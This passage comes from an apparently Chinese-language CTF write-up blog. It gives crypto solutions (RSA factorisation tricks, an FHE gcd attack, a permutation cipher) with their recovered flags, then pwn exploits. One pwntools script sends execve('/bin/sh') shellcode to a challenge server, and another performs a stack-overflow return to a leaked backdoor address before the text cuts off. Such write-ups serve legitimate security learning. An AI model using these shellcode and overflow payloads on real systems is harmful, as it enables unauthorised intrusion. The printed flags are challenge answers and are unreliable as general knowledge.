class="line"></span><br><span class="line">def extended_gcd(a, b):</span><br><span class="line">    if b == 0:</span><br><span class="line">        return (a, 1, 0)</span><br><span class="line">    g, x1, y1 = extended_gcd(b, a % b)</span><br><span class="line">    return (g, y1, x1 - (a // b) * y1)</span><br><span class="line"></span><br><span class="line">def recover_m1_from_n1(primes, n1_val, c1_val, e=65537):</span><br><span class="line">    # 1) 计算每个 prime 的幂次 t_i</span><br><span class="line">    t_list = []</span><br><span class="line">    tmp = n1_val</span><br><span class="line">    for p in primes:</span><br><span class="line">        cnt = 0</span><br><span class="line">        while tmp % p == 0:</span><br><span class="line">            tmp //= p</span><br><span class="line">            cnt += 1</span><br><span class="line">        if cnt == 0:</span><br><span class="line">            raise ValueError(&quot;给定的 prime 不整除 n1 ?&quot;)</span><br><span class="line">        t_list.append(cnt)</span><br><span class="line">    if tmp != 1:</span><br><span class="line">        # 说明给定 primes 列表可能不全</span><br><span class="line">        print(&quot;[!] 余下部分不为1，可能 primes 列表不完整。剩余 bitlen:&quot;, tmp.bit_length())</span><br><span class="line">    print(&quot;[*] par1: prime 指数 t_i =&quot;, t_list)</span><br><span class="line"></span><br><span class="line">    # 2) 计算 phi(p_i^&#123;t_i&#125;) = p^&#123;t_i-1&#125;*(p-1)</span><br><span class="line">    phis = []</span><br><span class="line">    mod_list = []</span><br><span class="line">    for p, t in zip(primes, t_list):</span><br><span class="line">        ph = p**(t-1) * (p-1)</span><br><span class="line">        phis.append(ph)</span><br><span class="line">        mod_list.append(p**t)</span><br><span class="line">    # 3) 计算 d = e^&#123;-1&#125; mod lcm(phis)</span><br><span class="line">    from math import lcm</span><br><span class="line">    L = 1</span><br><span class="line">    for ph in phis:</span><br><span class="line">        L = lcm(L, ph)</span><br><span class="line">    try:</span><br><span class="line">        d = invmod(e, L)</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(&quot;[!] 无法计算逆元 e mod lcm(phi)，异常:&quot;, ex)</span><br><span class="line">        # 仍可尝试使用 pow(c1, 1, n1) 或者直接尝试 CRT approach</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    # 4) 用 d 解密</span><br><span class="line">    m = pow(c1_val, d, n1_val)</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------- 主流程 -----------------</span><br><span class="line">def main():</span><br><span class="line">    print(&quot;[*] start par1 recovery ...&quot;)</span><br><span class="line">    m1 = recover_m1_from_n1(primes_list, n1, c1)</span><br><span class="line">    if m1 is None:</span><br><span class="line">        print(&quot;[!] par1 恢复失败。&quot;)</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            b = m1.to_bytes((m1.bit_length()+7)//8, &#x27;big&#x27;)</span><br><span class="line">            print(&quot;[+] par1 恢复到的 bytes (hex):&quot;, b.hex())</span><br><span class="line">            print(&quot;[+] par1 恢复到字符串（可能包含前半 flag）:&quot;, b.decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x27;))</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;[!] 转换为字符串失败：&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] start par1 recovery ...</span><br><span class="line">[*] par1: prime 指数 t_i = [3, 5, 7]</span><br><span class="line">[+] par1 恢复到的 bytes (hex): 666c61677b4f6f6f6f6f365f7930755f6b6e30775f4633726d</span><br><span class="line">[+] par1 恢复到字符串（可能包含前半 flag）: flag&#123;Ooooo6_y0u_kn0w_F3rm</span><br></pre></td></tr></table></figure>

<p>后半段思路为<code>后半段通过 gcd(n2, c2 - hint2^e) 抠出 r，再用 hint3 恢复 p,q，继而 RSA 解密得到 m mod pq，与 m mod r 用 CRT 合并得到完整 m2；与 par1 恢复出的 m1 拼接并用 long_to_bytes 得到最终 flag 字符串 @t_and_Eu13r_v3ry_w3ll!!&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># recover_flag.py</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from math import isqrt</span><br><span class="line">from math import gcd</span><br><span class="line"></span><br><span class="line"># --------- 你从题目/输出中得到的值（下面为会话中提供的真实数） ----------</span><br><span class="line"># par2 values (来自题目输出)</span><br><span class="line">n2 = 1069018081462192233874980694931144545150390355151142000407896565228521856087497130221328822828336193888433906258622424173888905902703892967253752403237818439004204769185744957222426788163474091322195131517000927031632213563726678357776820914860304114493023487392954636569155416533134778017635963554249754152905136768251720862406591818283210776943594065154793598910172412634428403766286774221252340847853800584819732893065160890727141088203583945705491817754798199</span><br><span class="line"></span><br><span class="line">hint1 = 495128350277196206878301144662871873237030348510695923954264742873861239639964327065778936381957512315649691671343380037835210964239285388639258116089512827565613815144843995253866231195560373946746849139176701974882655518646303907103018798645711804858249793838527221003421990186067508970406658504653011309012705975088331579176215562874130854040538446696646570783420605205142219423250083326857924937357413604293802370900521919578742651150371880416910794941782372</span><br><span class="line"></span><br><span class="line">hint2 = 30328561797365977072611520167046226865857127358764834983211668172910299946455309984910564878419440651867811045905957544019080032899770755776597512870488988655573901143704158135658656276142062054235425241921334990614594054774876139797881802290465401101513930547809082303438739954539239681192173563314964619128522116071538744700209974655230351192503911493028021717763873423132332205605117704777006410273001461242351682504368760936763922017247768057874236213463076</span><br><span class="line"></span><br><span class="line">hint3 = 20884722618082876001516601155402590958389763080024067634953470674302186115943562475648388511118550021010685094074280890845364756164094187193286427464829840</span><br><span class="line"></span><br><span class="line">c2 = 548415661734126053738347374438337003873176731288953351164055019598761821990636552806558989407452529293973596759395078164177029251755832478675308995116633955485067347066419466003081030015784908106772410713523387155248930421498438336128348929737424937920603679054765413736671822930257854740643178209639013528748572597042833138551717910328899462934527011212318128877188460373648545379405946354668400634037669394938860103705689139981117990256660685216959315741336968</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line"># -------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Step A: use gcd trick to extract r (512-bit prime)</span><br><span class="line">t = pow(hint2, e, n2)               # hint2^e mod n2</span><br><span class="line">g = gcd(n2, (c2 - t) % n2)          # r divides c2 - hint2^e</span><br><span class="line">r = g</span><br><span class="line">if r == 1 or r == n2:</span><br><span class="line">    raise SystemExit(&quot;gcd trick failed: got trivial factor&quot;)</span><br><span class="line"></span><br><span class="line"># Step B: compute N = p*q and recover p,q from S = hint3</span><br><span class="line">N = n2 // r</span><br><span class="line">S = hint3</span><br><span class="line">discr = S*S - 4*N</span><br><span class="line">sqrt_discr = isqrt(discr)</span><br><span class="line">if sqrt_discr*sqrt_discr != discr:</span><br><span class="line">    raise SystemExit(&quot;discriminant not a perfect square (unexpected)&quot;)</span><br><span class="line"></span><br><span class="line">p = (S - sqrt_discr)//2</span><br><span class="line">q = (S + sqrt_discr)//2</span><br><span class="line">assert p*q == N</span><br><span class="line"></span><br><span class="line"># Step C: recover m mod pq (use RSA decryption modulo pq)</span><br><span class="line">phi_pq = (p-1)*(q-1)</span><br><span class="line">d_pq = inverse(e, phi_pq)</span><br><span class="line">m_mod_pq = pow(c2, d_pq, N)</span><br><span class="line"></span><br><span class="line"># Step D: m mod r is hint2 mod r (since hint2 ≡ m (mod r))</span><br><span class="line">m_mod_r = hint2 % r</span><br><span class="line"></span><br><span class="line"># Step E: CRT combine to get m mod n2 (which is original m2)</span><br><span class="line"># simple pairwise CRT</span><br><span class="line">def crt_pair(a1, n1, a2, n2):</span><br><span class="line">    m1 = inverse(n1, n2)</span><br><span class="line">    m2 = inverse(n2, n1)</span><br><span class="line">    x = (a1 * n2 * m2 + a2 * n1 * m1) % (n1*n2)</span><br><span class="line">    return x</span><br><span class="line"></span><br><span class="line">m2 = crt_pair(m_mod_pq, N, m_mod_r, r)</span><br><span class="line"></span><br><span class="line"># Step F: convert to bytes</span><br><span class="line">m2_bytes = long_to_bytes(m2)</span><br><span class="line">print(&quot;Recovered m2 (hex):&quot;, m2_bytes.hex())</span><br><span class="line">print(&quot;Recovered m2 (ascii):&quot;, m2_bytes)</span><br><span class="line"></span><br><span class="line"># 如果 par1 的前半你已经恢复为 hex bytes，如你给出的:</span><br><span class="line">m1_hex = &quot;666c61677b4f6f6f6f6f365f7930755f6b6e30775f4633726d&quot;  # 这是你之前得到的 hex</span><br><span class="line">m1_bytes = bytes.fromhex(m1_hex)</span><br><span class="line"></span><br><span class="line">flag_bytes = m1_bytes + m2_bytes</span><br><span class="line">print(&quot;Flag bytes (ascii):&quot;, flag_bytes)</span><br><span class="line">print(&quot;Flag string:&quot;, flag_bytes.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="FHE-0-and-1"><a href="#FHE-0-and-1" class="headerlink" title="FHE: 0 and 1"></a>FHE: 0 and 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line">import math</span><br><span class="line">from itertools import product</span><br><span class="line">from functools import reduce</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def load_list(path):</span><br><span class="line">    return ast.literal_eval(open(path).read().strip())</span><br><span class="line"></span><br><span class="line">def is_probable_prime(n, k=6):</span><br><span class="line">    if n &lt; 2: return False</span><br><span class="line">    small = [2,3,5,7,11,13,17,19,23,29]</span><br><span class="line">    for p in small:</span><br><span class="line">        if n % p == 0:</span><br><span class="line">            return n == p</span><br><span class="line">    # Miller-Rabin</span><br><span class="line">    d = n-1</span><br><span class="line">    s = 0</span><br><span class="line">    while d % 2 == 0:</span><br><span class="line">        d //= 2; s += 1</span><br><span class="line">    for _ in range(k):</span><br><span class="line">        a = random.randrange(2, n-1)</span><br><span class="line">        x = pow(a, d, n)</span><br><span class="line">        if x == 1 or x == n-1: continue</span><br><span class="line">        for __ in range(s-1):</span><br><span class="line">            x = (x*x) % n</span><br><span class="line">            if x == n-1: break</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def try_find_p_simple(pks, try_count=4):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    用前 try_count 个 pk 做全穷举 offsets (1..10)。</span><br><span class="line">    返回候选 p（若找到）。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    m = min(try_count, len(pks))</span><br><span class="line">    indices = list(range(m))</span><br><span class="line">    for offsets in product(range(1,11), repeat=m):</span><br><span class="line">        vals = [pks[i] - offsets[i] for i in indices]</span><br><span class="line">        g = abs(reduce(math.gcd, vals))</span><br><span class="line">        # 若 gcd 很大，可能就是 p 或 k*p</span><br><span class="line">        if g.bit_length() &gt;= 120:</span><br><span class="line">            # 如果是素数就直接返回，否则也可能是 k*p</span><br><span class="line">            if is_probable_prime(g):</span><br><span class="line">                return g</span><br><span class="line">            else:</span><br><span class="line">                # 尝试把 g 除以小整数找出可能的素因子 q</span><br><span class="line">                for k in range(2, 100):</span><br><span class="line">                    if g % k == 0:</span><br><span class="line">                        q = g // k</span><br><span class="line">                        if q.bit_length() &gt;= 120 and is_probable_prime(q):</span><br><span class="line">                            return q</span><br><span class="line">                # 若没找到，也可以直接返回 g（后面仍可用作模）</span><br><span class="line">                return g</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def recover_bits_and_flag(p, ciphertext):</span><br><span class="line">    bits = []</span><br><span class="line">    for c in ciphertext:</span><br><span class="line">        r = c % p</span><br><span class="line">        bits.append(str(r &amp; 1))</span><br><span class="line">    bstr = &#x27;&#x27;.join(bits)</span><br><span class="line">    bytes_out = [int(bstr[i:i+8],2) for i in range(0,len(bstr),8)]</span><br><span class="line">    s = bytes(bytes_out).decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x27;)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    pks = load_list(&quot;pk.txt&quot;)</span><br><span class="line">    c = load_list(&quot;c.txt&quot;)</span><br><span class="line">    print(&quot;[*] 读取&quot;, len(pks), &quot;个 pk 和&quot;, len(c), &quot;个 c。&quot;)</span><br><span class="line">    # 先用前 3，再 4 个尝试（通常 3 就够）</span><br><span class="line">    for t in (3,4,5):</span><br><span class="line">        print(f&quot;[*] 用前 &#123;t&#125; 个 pk 穷举偏移...&quot;)</span><br><span class="line">        p_candidate = try_find_p_simple(pks, try_count=t)</span><br><span class="line">        if p_candidate:</span><br><span class="line">            print(&quot;[*] 找到候选 p (或其倍数)，bitlen =&quot;, p_candidate.bit_length())</span><br><span class="line">            flag = recover_bits_and_flag(p_candidate, c)</span><br><span class="line">            print(&quot;[*] 恢复出的字符串：&quot;)</span><br><span class="line">            print(flag)</span><br><span class="line">            if &quot;flag&#123;&quot; in flag:</span><br><span class="line">                print(&quot;[+] 成功！&quot;)</span><br><span class="line">                return</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[!] 结果不包含 flag&#123;...&#125;，但候选可继续分析。&quot;)</span><br><span class="line">    print(&quot;[!] 未找到，请增大 try_count 或手动分析候选 gcd。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h3><p>置换密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">def decrypt_permutation(ciphertext):</span><br><span class="line">    # 1. 定义字母到数字的映射 (A=1, B=2, ..., Z=26)</span><br><span class="line">    # 字典中存储的是 (数字: 字母)</span><br><span class="line">    num_to_char = &#123;i + 1: char for i, char in enumerate(string.ascii_uppercase)&#125;</span><br><span class="line">    </span><br><span class="line">    # 2. 定义逆置换 F^-1 的映射表 (即：密文数字 -&gt; 明文数字)</span><br><span class="line">    # 这是我们通过反转轮换 F = (1 4 7 2 5)(3 6)(8 11 12)(9 10 13 14) 计算得出的</span><br><span class="line">    # F^-1 = (5 2 7 4 1)(6 3)(12 11 8)(14 13 10 9)</span><br><span class="line">    </span><br><span class="line">    # 查找表： key=密文数字, value=明文数字</span><br><span class="line">    inverse_map = &#123;</span><br><span class="line">        # 轮换 (5 2 7 4 1)</span><br><span class="line">        1: 5,  # C_1 -&gt; P_5</span><br><span class="line">        5: 2,  # C_5 -&gt; P_2</span><br><span class="line">        2: 7,  # C_2 -&gt; P_7</span><br><span class="line">        7: 4,  # C_7 -&gt; P_4</span><br><span class="line">        4: 1,  # C_4 -&gt; P_1</span><br><span class="line">        # 轮换 (6 3)</span><br><span class="line">        3: 6,</span><br><span class="line">        6: 3,</span><br><span class="line">        # 轮换 (12 11 8)</span><br><span class="line">        8: 12,</span><br><span class="line">        12: 11,</span><br><span class="line">        11: 8,</span><br><span class="line">        # 轮换 (14 13 10 9)</span><br><span class="line">        9: 14,</span><br><span class="line">        14: 13,</span><br><span class="line">        13: 10,</span><br><span class="line">        10: 9</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # 3. 执行解密</span><br><span class="line">    plaintext = []</span><br><span class="line">    </span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        if &#x27;A&#x27; &lt;= char &lt;= &#x27;Z&#x27;:</span><br><span class="line">            # 转换为密文数字</span><br><span class="line">            cipher_num = ord(char) - ord(&#x27;A&#x27;) + 1</span><br><span class="line">            </span><br><span class="line">            # 查找逆置换：</span><br><span class="line">            # 如果数字在 1-14 范围内，使用查找表；否则，它是不变的 (F(x)=x)，直接映射</span><br><span class="line">            plain_num = inverse_map.get(cipher_num, cipher_num)</span><br><span class="line">            </span><br><span class="line">            # 转换回明文大写字母</span><br><span class="line">            plain_char = num_to_char[plain_num]</span><br><span class="line">            plaintext.append(plain_char)</span><br><span class="line">            </span><br><span class="line">        else:</span><br><span class="line">            # 非字母符号 (空格、下划线、句点) 保持不变</span><br><span class="line">            plaintext.append(char)</span><br><span class="line">            </span><br><span class="line">    return &quot;&quot;.join(plaintext)</span><br><span class="line"></span><br><span class="line"># 待解密密文</span><br><span class="line">CIPHERTEXT = &quot;SUFK_D_SJNPHA_PARNUTDTJOI_WJHH_GACJIJTAHY_IOT_STUNP_YOU.&quot;</span><br><span class="line"></span><br><span class="line"># 执行解密</span><br><span class="line">decrypted_message = decrypt_permutation(CIPHERTEXT)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(f&quot;密文: &#123;CIPHERTEXT&#125;&quot;)</span><br><span class="line">print(f&quot;明文: &#123;decrypted_message&#125;&quot;)</span><br></pre></td></tr></table></figure>



<p>SUCH_A_SIMPLE_PERMUTATION_WILL_DEFINITELY_NOT_STUMP_YOU.</p>
<h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="input-function"><a href="#input-function" class="headerlink" title="input_function"></a>input_function</h3><p>Shellcode 注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 远程目标地址和端口</span><br><span class="line">HOST = &#x27;39.106.48.123&#x27; </span><br><span class="line">PORT = 43714 </span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------</span><br><span class="line"># 修正: 直接使用硬编码的 x64 Shellcode 机器码，绕过 &#x27;as&#x27; 汇编器</span><br><span class="line"># This is execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br><span class="line">shellcode = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span><br><span class="line"># ----------------------------------------------------</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27; # 依然需要设置架构，但这次用于上下文信息</span><br><span class="line">context.log_level = &#x27;info&#x27;</span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    log.info(f&quot;Connecting to &#123;HOST&#125;:&#123;PORT&#125;&quot;)</span><br><span class="line">    try:</span><br><span class="line">        io = remote(HOST, PORT)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        log.error(f&quot;Failed to connect: &#123;e&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    log.info(f&quot;Shellcode length: &#123;len(shellcode)&#125; bytes&quot;)</span><br><span class="line"></span><br><span class="line">    # 接收提示信息</span><br><span class="line">    io.recvuntil(b&quot;please input a function(after compile)\n&quot;)</span><br><span class="line"></span><br><span class="line">    # 发送 Shellcode</span><br><span class="line">    log.success(&quot;Sending hardcoded shellcode to the executable memory region...&quot;)</span><br><span class="line">    # 使用 sendline 发送 Shellcode，通常 read() 接收完毕后需要一个换行符</span><br><span class="line">    io.sendline(shellcode) </span><br><span class="line"></span><br><span class="line">    # 进入交互模式</span><br><span class="line">    log.success(&quot;Shellcode executed! Switching to interactive mode to get the flag.&quot;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="17.png" alt="17"></p>
<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">HOST = &#x27;8.147.132.32&#x27;</span><br><span class="line">PORT = 40772</span><br><span class="line"># 修正后的填充长度: 256 (buffer) + 8 (saved RBP) = 264 字节</span><br><span class="line">PADDING_SIZE = 264 </span><br><span class="line"># 首次尝试偏移量: 假设 backd00r 在 unexcutable 之前 0x20 字节处</span><br><span class="line">OFFSET = -0x20 </span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;info&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    log.info(f&quot;Connecting to &#123;HOST&#125;:&#123;PORT&#125;&quot;)</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    # 1. 解析泄露的地址</span><br><span class="line">    backdoor_addr = None </span><br><span class="line">    io.recvuntil(b&quot;This is the address of the backdoor function: &quot;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        leak_addr_str = io.recvline().strip()</span><br><span class="line">        unexcutable_addr = int(leak_addr_str, 16)</span><br><span class="line">    except Exception:</span><br><span class="line">        log.error(&quot;Failed to parse address line.&quot;)</span><br><span class="line">        io.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    log.success(f&quot;Leaked UNEXCUTABLE Address: &#123;hex(unexcutable_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 2. 计算真正的 backd00r 地址</span><br><span class="line">    real_backdoor_addr = unexcutable_addr + OFFSET</span><br><span class="line">    log.success(f&quot;Calculated REAL BACKDOOR Address (&#123;hex(OFFSET)&#125; offset): &#123;hex(real_backdoor_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 接收剩余的提示信息，直到 &quot;Enter your input:&quot;</span><br><span class="line">    io.recvuntil(b&quot;Enter your input:\n&quot;)</span><br><span class="line"></span><br><span class="line">    # 3. 构造 Payload (264 字节填充 + 8 字节 backd00r 地址)</span><br><span class="line">    payload = b&#x27;A&#x27; * PADDING_SIZE</span><br><span class="line">    payload += p64(real_backdoor_addr)</span><br><span class="line">    </span><br><span class="line">    log.info(f&quot;Payload size: &#123;len(payload)&#125; bytes&quot;)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    # 4. 自动执行命令并接收 Flag</span><br><span class="line">    log.success(&quot;Exploit sent! Shell should be stable now. Sending &#x27;cat flag&#x27;...&quot;)</span><br><span class="line">    </span><br><span 